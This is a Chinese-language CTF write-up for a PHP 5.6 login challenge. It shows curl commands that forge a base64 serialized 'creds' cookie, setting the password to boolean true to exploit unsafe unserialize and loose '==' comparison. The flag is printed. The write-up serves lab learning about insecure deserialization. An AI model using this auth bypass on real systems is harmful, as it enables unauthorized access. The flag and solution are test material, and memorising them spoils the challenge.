## 题解

### 入口与指纹

`Apache/2.4.25 (Debian)` + **`X-Powered-By: PHP/5.6.40`**，标题 `AUTH 04`
（Springfield / Simpsons 主题）。

```html
<form action="index.php" method="POST">
  Username: <input type="text" name="username">
  Password: <input type="password" name="password">
</form>
```

### 关键观察

**1. 登录不做任何校验，只把凭据塞进一个可序列化的 cookie。**

```bash
curl -i -d 'username=admin&password=admin' http://$T/index.php
# 302
# Set-Cookie: creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjt9
```

base64 解出来是 PHP 序列化字符串：

```text
a:2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}
```

用任意用户名/口令都能得到对应 cookie（`zzz/zzz`、`homer/homer` 都行），
说明登录只是一个"把输入序列化进 cookie"的过程，没有任何真实认证。

**2. 页面用 cookie 里的 username 渲染，并判断是不是 admin。**

```html
<User: admin>
<h3>Oh Sorry but...you are not the admin :(</h3>
```

用 `admin` 也照样"不是 admin"，说明判定不是简单的字符串相等，
而是 `password` 那一侧还有比较。

**3. 反序列化 + 弱比较（PHP 5.x 典型）。**

cookie 完全由客户端控制，服务端直接 `unserialize(base64_decode($_COOKIE['creds']))`。
把 `password` 的类型从字符串改成布尔 `true`：

```text
a:2:{s:8:"username";s:5:"admin";s:8:"password";b:1;}
```

就通过了。原因是 PHP 的松散比较（`==`）里
**`true == "任意非空字符串"` 恒为 true**，所以不需要知道真实口令。

### 利用链

```bash
T=$(head -1 .target)
cookie=$(printf '%s' 'a:2:{s:8:"username";s:5:"admin";s:8:"password";b:1;}' | base64 -w0)
curl -sS -H "Cookie: creds=$cookie" "http://$T/index.php" | grep -o 'flag{[^}]*}'
```

响应：

```html
Congratulations, here is the flag: flag{adaf8d85-dc7b-4e1a-99ce-cb22a5f563a7}
```

也可以先正常登录拿到 cookie，再只把 `password` 的 `s:5:"admin"` 换成 `b:1`。

### flag 位置

带着被篡改的 `creds` cookie 请求 `index.php` 时，成功分支渲染出 flag。

## 复盘

- **`X-Powered-By: PHP/5.6.40` 是强信号。** 5.x 的松散比较行为（`"0e123" == "0e456"`、
  `true == "任意非空字符串"`、`"admin" == 0`）是经典考点。看到 5.x 就应该先想起类型混淆。
- **cookie 里出现 `a:2:{s:…}` 就是 PHP 序列化。** 用 base64 解一下就能看清结构，
  然后就可以任意改类型、加字段、换类名——这是"不安全反序列化"的标准入口。
- **先摸清"判定在哪一侧"。** 我用 6 个 cookie 变体做对照：
  - 只给 `username` → 不是 admin；
  - 追加 `is_admin=true` → 不是 admin；
  - 追加 `role=admin` → 不是 admin；
  - **把 `password` 改成 `b:1` → 通过**。
  这说明判定条件用的是 `$creds['password']`，且是松散比较。
  如果一开始就盲目加 `is_admin`/`role`，会白试很多轮。
- **登录不校验本身就是线索。** 任意凭据都能拿到 cookie，说明"认证"其实发生在
  cookie 解析这一步；真正要攻击的是 cookie 而不是登录表单。
